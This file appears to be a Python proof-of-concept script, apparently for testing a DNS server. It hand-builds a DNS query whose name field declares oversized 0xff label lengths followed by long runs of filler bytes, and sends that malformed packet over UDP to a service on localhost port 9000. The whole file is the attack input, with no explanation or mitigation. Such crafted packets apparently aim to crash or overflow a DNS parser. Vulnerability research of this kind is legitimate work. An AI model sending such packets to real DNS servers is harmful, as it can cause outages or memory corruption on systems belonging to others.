import socket

if __name__ == "__main__":
	#print("poc")
	conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	conn.connect(("127.0.0.1", 9000))


	ID = b"\x12\x23"
	FLAGS = b"\x01\x00"
	QDCOUNT = b"\x00\x01"
	ANCOUNT = b"\x00\x00"
	NSCOUNT = b"\x00\x00"
	ARCOUNT = b"\x00\x00"

	HEADER = ID + FLAGS + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT

	QNAME = b"\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\x00"
	QTYPE = b"\x00\x01"
	QCLASS = b"\x00\x01"

	QUESTION = QNAME + QTYPE + QCLASS

	PACKET = HEADER + QUESTION

	conn.send(PACKET)